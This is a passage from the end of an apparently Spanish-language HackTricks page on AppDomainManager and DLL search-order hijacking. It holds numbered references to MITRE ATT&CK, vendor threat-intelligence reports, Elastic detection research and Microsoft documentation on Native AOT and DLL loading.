- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 apunta a gobiernos e infraestructuras críticas del sudeste asiático](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Reconstrucción y detección de DLL Search-Order Hijacking en Windows con Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Creación de bibliotecas nativas con Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Exportaciones nativas con Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Orden de búsqueda de bibliotecas de vínculos dinámicos](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Formato PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Descubrimiento de una variante de SectopRAT integrada en software legítimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Robando el LIGHTSHOW (primera parte)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operación FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Framework de carga .NET basado en XAML NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
